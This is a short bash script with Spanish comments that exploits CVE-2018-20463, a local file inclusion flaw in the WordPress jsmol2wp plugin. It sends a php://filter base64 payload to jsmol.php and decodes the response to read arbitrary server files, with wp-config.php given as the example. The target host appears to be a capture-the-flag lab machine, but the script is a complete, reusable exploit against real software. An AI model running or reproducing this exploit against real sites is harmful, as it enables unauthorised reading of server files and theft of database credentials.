#!/bin/bash
# Exploit chain para WordPress con plugin jsmol2wp vulnerable (CVE-2018-20463)
# Uso: ./lfi_jsmol.sh <URL_BASE> <ARCHIVO_A_LEER>
# Ejemplo: ./lfi_jsmol.sh http://www.smol.thm ../../../../wp-config.php
#
# Requisitos: target con /wp-content/plugins/jsmol2wp/php/jsmol.php accesible
# Lee archivos arbitrarios con permisos de www-data.
set -e
BASE="${1:?Uso: $0 <URL_BASE> <ruta>}"
FILE="${2:?Falta la ruta a leer}"
# El path puede ser relativo al CWD del script o absoluto
curl -s --max-time 15 "${BASE}/wp-content/plugins/jsmol2wp/php/jsmol.php?query=php://filter/convert.base64-encode/resource=${FILE}" | base64 -d 2>/dev/null
